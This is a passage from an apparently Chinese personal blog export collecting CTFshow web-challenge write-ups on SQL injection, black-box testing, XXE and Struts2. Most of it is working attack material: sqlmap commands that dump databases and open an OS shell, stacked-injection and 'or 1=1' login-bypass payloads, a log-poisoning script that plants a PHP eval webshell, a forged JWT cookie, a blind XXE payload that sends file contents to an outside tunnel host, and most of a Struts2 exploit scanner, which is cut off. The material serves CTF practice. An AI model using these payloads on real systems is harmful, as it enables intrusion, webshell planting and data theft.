<p><a href="https://www.cnblogs.com/mmzuo-798/p/11634055.html">https://www.cnblogs.com/mmzuo-798/p/11634055.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://bde36fa6-18e9-4375-999a-b797506078f2.challenge.ctf.show/api/index.php --method=&quot;PUT&quot; --header=&quot;Content-Type:text/plain&quot; --referer=&quot;http://bde36fa6-18e9-4375-999a-b797506078f2.challenge.ctf.show/sqlmap.php&quot; --dump --data=&quot;id=1&quot;</span><br></pre></td></tr></table></figure>

<p>ctfshow{af320e41-a9df-44e1-b286-3e61d4e4b33b}</p>
<h2 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;update(ctfshow_user)set`username`=1;</span><br><span class="line">1;update(ctfshow_user)set`pass`=1;</span><br></pre></td></tr></table></figure>

<p>注入到用户名中</p>
<p>，密码为1，账号为1</p>
<h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><h2 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h2>]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-黑盒测试</title>
    <url>/2023/04/16/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>  ctfshow 黑盒测试</p>
  <span id="more"></span>

<h2 id="web381"><a href="#web381" class="headerlink" title="web381"></a>web381</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://81d1568a-588d-4fc9-abeb-369f884876f7.challenge.ctf.show/alsckdfy/</span><br></pre></td></tr></table></figure>

<p>访问这个地址即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;&gt;</span><br><span class="line">  &lt;title&gt;CTFshow萌新博客&lt;/title&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;layui/css/layui.css&quot;&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;layui/css/global.css&quot;&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;alsckdfy/layui/css/tree.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure>

<p>这个地址在源码里可以看到</p>
<h2 id="web382-web383"><a href="#web382-web383" class="headerlink" title="web382,web383"></a>web382,web383</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://81d1568a-588d-4fc9-abeb-369f884876f7.challenge.ctf.show/alsckdfy/</span><br></pre></td></tr></table></figure>

<p>访问这里，万能密码登录即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or 1=1-- -</span><br></pre></td></tr></table></figure>

<h2 id="web384"><a href="#web384" class="headerlink" title="web384"></a>web384</h2><p>生成字典的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line">s1=string.ascii_lowercase</span><br><span class="line">s2=string.digits</span><br><span class="line">f=open(&#x27;dict.txt&#x27;,&#x27;w&#x27;)</span><br><span class="line">for i in s1:</span><br><span class="line">	for j in s1:</span><br><span class="line">		for k in s2:</span><br><span class="line">			for l in s2:</span><br><span class="line">				for m in s2:</span><br><span class="line">					p=i+j+k+l+m</span><br><span class="line">					f.write(p+&quot;\n&quot;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<h2 id="web385"><a href="#web385" class="headerlink" title="web385"></a>web385</h2><p>扫一下，发现install</p>
<p>访问一下，出现</p>
<p>请务必在安装成功后删除本文件<br>需要重新安装请访问install&#x2F;?install,管理员密码将重置为默认密码</p>
<p>访问一下&#x2F;install&#x2F;?install</p>
<p>再次登录&#x2F;alsckdfy&#x2F;</p>
<p>初始户名密码<code>admin admin888</code></p>
<p>这是由之前的题得出来的</p>
<h2 id="web386"><a href="#web386" class="headerlink" title="web386"></a>web386</h2><p>访问install</p>
<p>lock.dat存在，你已经安装过了，请勿重复安装</p>
<p>访问clear.php,猜一手，file参数删除文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/clear.php?file=index.php</span><br></pre></td></tr></table></figure>

<p>然后页面就没没了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/clear.php?file=install/lock.php</span><br></pre></td></tr></table></figure>

<p>继续访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/alsckdfy/     登录即可</span><br></pre></td></tr></table></figure>

<h2 id="web387"><a href="#web387" class="headerlink" title="web387"></a>web387</h2><p>robots.txt存在&#x2F;debug</p>
<p>访问debug</p>
<p>内容是</p>
<p>file not exist</p>
<p>猜一下是传递一个file参数，文件包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/debug?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>无法写入马，命令执行无回显</p>
<p>直接尝试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;cat /var/www/html/alsckdfy/check.php&gt;/var/www/html/1.txt&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web388"><a href="#web388" class="headerlink" title="web388"></a>web388</h2><p>写入绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">url=&quot;http://1dbe73d8-655c-4c06-a9c2-057cd44eaf2f.challenge.ctf.show/&quot;</span><br><span class="line">url2=&quot;http://1dbe73d8-655c-4c06-a9c2-057cd44eaf2f.challenge.ctf.show//debug/?file=/var/log/nginx/access.log&quot;</span><br><span class="line">cmd=b&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span><br><span class="line">cmd=base64.b64encode(cmd).decode()</span><br><span class="line">headers=&#123;</span><br><span class="line">	&#x27;User-Agent&#x27;:&#x27;&#x27;&#x27;&lt;?php system(&#x27;echo &#123;0&#125;|base64 -d  &gt; /var/www/html/b.php&#x27;);?&gt;&#x27;&#x27;&#x27;.format(cmd)</span><br><span class="line">&#125;</span><br><span class="line">print(headers)</span><br><span class="line">requests.get(url=url,headers=headers)</span><br><span class="line">requests.get(url2)</span><br><span class="line">print(requests.post(url+&#x27;b.php&#x27;,data=&#123;&#x27;1&#x27;:&#x27;system(&quot;cat alsckdfy/check.php&quot;);&#x27;&#125;).text)</span><br></pre></td></tr></table></figure>

<h2 id="web389"><a href="#web389" class="headerlink" title="web389"></a>web389</h2><p>jwt 伪造，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">url=&quot;http://bf2e6fca-c437-4f5b-90c3-75b4087cfdc5.chall.ctf.show/&quot;</span><br><span class="line">url2=&quot;http://bf2e6fca-c437-4f5b-90c3-75b4087cfdc5.chall.ctf.show/debug/?file=/var/log/nginx/access.log&quot;</span><br><span class="line">cmd=b&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span><br><span class="line">cmd=base64.b64encode(cmd).decode()</span><br><span class="line">headers=&#123;</span><br><span class="line">	&#x27;User-Agent&#x27;:&#x27;&#x27;&#x27;&lt;?php system(&#x27;echo &#123;0&#125;|base64 -d  &gt; /var/www/html/b.php&#x27;);?&gt;&#x27;&#x27;&#x27;.format(cmd),</span><br><span class="line">	&#x27;Cookie&#x27;:&#x27;auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYxMDQ0MDA5MSwiZXhwIjoxNjEwNDQ3MjkxLCJuYmYiOjE2MTA0NDAwOTEsInN1YiI6ImFkbWluIiwianRpIjoiYzNlM2U5NjQ4OGI3NWY0MzY4YmE4Njg0ZTRjZWJlZTQifQ.hEV8CkkdvhKsNL_OrssrBzjzstVhq7_sQNefiuplSqU&#x27;</span><br><span class="line">&#125;</span><br><span class="line">print(headers)</span><br><span class="line">requests.get(url=url,headers=headers)</span><br><span class="line">requests.get(url2,headers=headers)</span><br><span class="line">print(requests.post(url+&#x27;b.php&#x27;,data=&#123;&#x27;1&#x27;:&#x27;system(&quot;cat alsckdfy/check.php&quot;);&#x27;&#125;,headers=headers).text)</span><br></pre></td></tr></table></figure>



<h2 id="web390"><a href="#web390" class="headerlink" title="web390"></a>web390</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://6db122df-7ba0-4835-bb91-00984aed8475.challenge.ctf.show/page.php?id=1 --os-shell -batch </span><br></pre></td></tr></table></figure>

<p>直接拿到shell,但这个shell好像只有cat 权限。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://fdbabc63-b2f3-4050-8b2e-9f5ee609119a.chall.ctf.show/page.php?id=2 --file-read /var/www/html/alsckdfy/check.php --batch</span><br></pre></td></tr></table></figure>

<p>运行完会将文件保存在你的本地，直接访问就拿到flag</p>
<h2 id="web391"><a href="#web391" class="headerlink" title="web391"></a>web391</h2><p>左上角出来一个萌新往事，这个猜一下就知道是注入点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://86300148-3fae-429c-bd62-2397e24809b8.challenge.ctf.show/search.php?title=123 --os-shell --batch</span><br></pre></td></tr></table></figure>

<h2 id="web392"><a href="#web392" class="headerlink" title="web392"></a>web392</h2><p>如上391</p>
<h2 id="web393"><a href="#web393" class="headerlink" title="web393"></a>web393</h2><p>在萌新往事里有注入点搜索</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://1ad914e4-74b3-4f2b-8aa9-d8ea8e9755e8.challenge.ctf.show/search.php?title=123 --current-db</span><br></pre></td></tr></table></figure>

<p>数据库ctfshow</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://94520176-d91c-4e45-8f53-206a179b60f7.challenge.ctf.show/search.php?title=4 -D &#x27;ctfshow&#x27; --tables</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin_user |</span><br><span class="line">| content    |</span><br><span class="line">| link </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://1ad914e4-74b3-4f2b-8aa9-d8ea8e9755e8.challenge.ctf.show/search.php?title=123 -D ctfshow -T link --columns</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| Column | Type         |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| id     | int(11)      |</span><br><span class="line">| name   | varchar(255) |</span><br><span class="line">| url    | varchar(255) </span><br></pre></td></tr></table></figure>

<p>堆叠注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/search.php?title=1&#x27;;insert into link values(99,&#x27;flag&#x27;,&#x27;file:///flag&#x27;);</span><br></pre></td></tr></table></figure>

<p>然后访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/link.php?id=99</span><br></pre></td></tr></table></figure>

<p>即可看见flag</p>
<h2 id="web394-395未写"><a href="#web394-395未写" class="headerlink" title="web394,395未写"></a>web394,395未写</h2>]]></content>
  </entry>
  <entry>
    <title>ctfshowxxe</title>
    <url>/2023/03/13/ctfshowxxe/</url>
    <content><![CDATA[<p>   xxe</p>
<span id="more"></span>

<p><a href="https://blog.csdn.net/qq_63844103/article/details/128060556?ops_request_misc=%7B%22request_id%22:%22167868664316800182744486%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=167868664316800182744486&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-128060556-null-null.142%5Ev73%5Epc_new_rank,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=xxe&spm=1018.2226.3001.4187">(8条消息) 【web安全】——XXE漏洞快速入门_xxe漏洞利用_白昼安全的博客-CSDN博客</a></p>
<p><strong>内部实体就相当于自己编写DTD内容，而外部实体就相当于引入外部的DTD内容</strong></p>
<p>外部实体:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>参数实体的<strong>声明</strong>：<code>&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;</code></p>
<p><strong>引用</strong>参数实体的方法：<code>%实体名称;</code></p>
<h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);   <span class="comment">//$dom第一个节点</span></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;     <span class="comment">//$creds节点的ctfshow</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>

<p>hackbar无法传参，只能bp传参,修改文本长度，随便长度即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;zhou&gt;   //根元素</span><br><span class="line">&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;   //子元素   引用一般实体的方法：&amp;实体名称</span><br><span class="line">&lt;/zhou&gt;</span><br></pre></td></tr></table></figure>

<p>关于simplexml_import_dom</p>
<p>simplexml_import_dom() 函数把 DOM 节点转换为 SimpleXMLElement 对象。</p>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dom = new domDocument;</span><br><span class="line">$dom-&gt;loadXML(&#x27;&lt;note&gt;&lt;from&gt;John&lt;/from&gt;&lt;/note&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">$xml = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">echo $xml-&gt;from;</span><br><span class="line">?&gt;</span><br><span class="line">//输出：John</span><br></pre></td></tr></table></figure>

<p>file:&#x2F;&#x2F;&#x2F;flag        &#x2F;&#x2F;file协议</p>
<p><strong>DOM 节点</strong></p>
<p>根据 DOM，XML 文档中的每个成分都是一个<strong>节点</strong>。</p>
<p>DOM 是这样规定的：</p>
<ul>
<li>整个文档是一个文档节点</li>
<li>每个 XML 元素是一个元素节点</li>
<li>包含在 XML 元素中的文本是文本节点</li>
<li>每一个 XML 属性是一个属性节点</li>
<li>注释是注释节点</li>
</ul>
<h2 id="web374-376"><a href="#web374-376" class="headerlink" title="web374-376"></a>web374-376</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>

<p>没有echo</p>
<p>在网站下创建一个test.dtd文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;https://384fb1c7.r2.cpolar.cn/xxe/xxe.php?q=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>

<p>创建一个接收$file的php文件，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$xxe</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>]);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&#x27;flag.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$txt</span>,<span class="variable">$xxe</span>,FILE_APPEND)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://384fb1c7.r2.cpolar.cn/xxe/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">] &gt;</span>   </span><br></pre></td></tr></table></figure>

<p>通过执行我网站下的dtd内容来访问我的网站，获得flag</p>
<p><code>ctfshow&#123;67b34bff-45b9-4935-bfb4-679f7fdd10b4&#125;</code></p>
<p>web375</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;, $xmlfile))&#123;</span><br><span class="line">    die(&#x27;error&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h2><p><code>Content-Type: application/xml;charset=utf-8</code></p>
<p>抓包返回看类型可知xml提交参数</p>
<p><code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt; &lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</code></p>
<p>即可回显</p>
<p><code>ctfshow&#123;34c67ba7-bb24-4ac1-a485-c0e8c15dc550&#125;</code></p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-java</title>
    <url>/2023/04/18/ctfshow-java/</url>
    <content><![CDATA[<p>​    ctfshow-java</p>
 <span id="more"></span>



<p><a href="https://github.com/Vancomycin-g/Struts2Scan">https://github.com/Vancomycin-g/Struts2Scan</a></p>
<p>改良版的</p>
<p>或者用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import shlex</span><br><span class="line">import random</span><br><span class="line">import base64</span><br><span class="line">import copy</span><br><span class="line">import os</span><br><span class="line">import hashlib</span><br><span class="line">import string</span><br><span class="line">import click</span><br><span class="line">import requests</span><br><span class="line">import urllib.request</span><br><span class="line">import urllib.parse</span><br><span class="line">import urllib.error</span><br><span class="line">import time</span><br><span class="line">from requests.exceptions import ChunkedEncodingError, ConnectionError, ConnectTimeout</span><br><span class="line">from urllib.parse import quote, unquote</span><br><span class="line">from functools import partial</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">from concurrent import futures</span><br><span class="line"> </span><br><span class="line">__title__ = &#x27;Struts2 Scan&#x27;</span><br><span class="line">__version__ = &#x27;0.1&#x27;</span><br><span class="line">__author__ = &#x27;HatBoy&#x27;</span><br><span class="line"> </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">基于互联网上已经公开的Structs2高危漏洞exp的扫描利用工具，目前支持的漏洞如下：</span><br><span class="line">S2-001,S2-003,S2-005,S2-007,S2-008,S2-009,S2-012,S2-013,S2-015,S2-016,S2-019,</span><br><span class="line">S2-029,S2-032,S2-033,S2-037,S2-045,S2-046,S2-048,S2-052,S2-053,S2-devMode</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line">default_headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&#x27;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"># 全局代理</span><br><span class="line">proxies = None</span><br><span class="line"># 超时时间</span><br><span class="line">_tiemout = 10</span><br><span class="line"># 默认输出所有结果，包括不存在漏洞的</span><br><span class="line">is_quiet = False</span><br><span class="line"># 进程数</span><br><span class="line">process = 10</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get(url, headers=None, encoding=&#x27;UTF-8&#x27;):</span><br><span class="line">    &quot;&quot;&quot;GET请求发送包装&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        html = requests.get(url, headers=headers, proxies=proxies, timeout=_tiemout)</span><br><span class="line">        html = html.content.decode(encoding)</span><br><span class="line">        return html.replace(&#x27;\x00&#x27;, &#x27;&#x27;).strip()</span><br><span class="line">    except ChunkedEncodingError as e:</span><br><span class="line">        html = get_stream(url, headers, encoding)</span><br><span class="line">        return html</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接错误&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接超时错误&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get_302(url, headers=None, encoding=&#x27;UTF-8&#x27;):</span><br><span class="line">    &quot;&quot;&quot;GET请求发送包装&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        html = requests.get(url, headers=headers, proxies=proxies, timeout=_tiemout, allow_redirects=False)</span><br><span class="line">        status_code = html.status_code</span><br><span class="line">        if status_code == 302:</span><br><span class="line">            html = html.headers.get(&quot;Location&quot;, &quot;&quot;)</span><br><span class="line">        elif status_code == 200:</span><br><span class="line">            html = html.content.decode(encoding)</span><br><span class="line">            html = html.replace(&#x27;\x00&#x27;, &#x27;&#x27;).strip()</span><br><span class="line">        else:</span><br><span class="line">            html = &quot;&quot;</span><br><span class="line">        return html</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接错误&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接超时错误&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get_stream(url, headers=None, encoding=&#x27;UTF-8&#x27;):</span><br><span class="line">    &quot;&quot;&quot;分块接受数据&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        lines = requests.get(url, headers=headers, timeout=_tiemout, stream=True, proxies=proxies)</span><br><span class="line">        html = list()</span><br><span class="line">        for line in lines.iter_lines():</span><br><span class="line">            if b&#x27;\x00&#x27; in line:</span><br><span class="line">                break</span><br><span class="line">            line = line.decode(encoding)</span><br><span class="line">            html.append(line.strip())</span><br><span class="line">        return &#x27;\r\n&#x27;.join(html).strip()</span><br><span class="line">    except ChunkedEncodingError as e:</span><br><span class="line">        return &#x27;\r\n&#x27;.join(html).strip()</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接错误&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接超时错误&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def post(url, data=None, headers=None, encoding=&#x27;UTF-8&#x27;, files=None):</span><br><span class="line">    &quot;&quot;&quot;POST请求发送包装&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        html = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=_tiemout, files=files)</span><br><span class="line">        html = html.content.decode(encoding)</span><br><span class="line">        return html.replace(&#x27;\x00&#x27;, &#x27;&#x27;).strip()</span><br><span class="line">    except ChunkedEncodingError as e:</span><br><span class="line">        html = post_stream(url, data, headers, encoding, files)</span><br><span class="line">        return html</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接错误&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接超时错误&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def post_stream(url, data=None, headers=None, encoding=&#x27;UTF-8&#x27;, files=None):</span><br><span class="line">    &quot;&quot;&quot;分块接受数据&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        lines = requests.post(url, data=data, headers=headers, timeout=_tiemout, stream=True, proxies=proxies,</span><br><span class="line">                              files=None)</span><br><span class="line">        html = list()</span><br><span class="line">        for line in lines.iter_lines():</span><br><span class="line">            line = line.decode(encoding)</span><br><span class="line">            html.append(line.strip())</span><br><span class="line">        return &#x27;\r\n&#x27;.join(html).strip()</span><br><span class="line">    except ChunkedEncodingError as e:</span><br><span class="line">        return &#x27;\r\n&#x27;.join(html).strip()</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接错误&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接超时错误&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def encode_multipart(exp):</span><br><span class="line">    &quot;&quot;&quot;创建multipart/form-data数据包&quot;&quot;&quot;</span><br><span class="line">    boundary = &#x27;----------%s&#x27; % hex(int(time.time() * 1000))</span><br><span class="line">    data = list()</span><br><span class="line">    data.append(&#x27;--%s&#x27; % boundary)</span><br><span class="line">    content = b&#x27;x&#x27;</span><br><span class="line">    decoded_content = content.decode(&#x27;ISO-8859-1&#x27;)</span><br><span class="line">    data.append(&#x27;Content-Disposition: form-data; name=&quot;test&quot;; filename=&quot;&#123;exp&#125;&quot;&#x27;.format(exp=exp))</span><br><span class="line">    data.append(&#x27;Content-Type: text/plain\r\n&#x27;)</span><br><span class="line">    data.append(decoded_content)</span><br><span class="line">    data.append(&#x27;--%s--\r\n&#x27; % boundary)</span><br><span class="line">    return &#x27;\r\n&#x27;.join(data), boundary</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def post_file(url, exp, headers=None, encoding=&#x27;UTF-8&#x27;):</span><br><span class="line">    &quot;&quot;&quot;S2-046漏洞专用&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        coded_params, boundary = encode_multipart(exp)</span><br><span class="line">        if proxies:</span><br><span class="line">            proxy_support = urllib.request.ProxyHandler(proxies)</span><br><span class="line">            opener = urllib.request.build_opener(proxy_support)</span><br><span class="line">            urllib.request.install_opener(opener)</span><br><span class="line">        req = urllib.request.Request(url, coded_params.encode(&#x27;ISO-8859-1&#x27;))</span><br><span class="line">        req.add_header(&#x27;Content-Type&#x27;, &#x27;multipart/form-data; boundary=%s&#x27; % boundary)</span><br><span class="line">        if headers:</span><br><span class="line">            for key, value in headers.items():</span><br><span class="line">                req.add_header(key, value)</span><br><span class="line">        resp = urllib.request.urlopen(req)</span><br><span class="line">        html = resp.read().decode(encoding)</span><br><span class="line">        return html</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接错误&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTP连接超时错误&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + 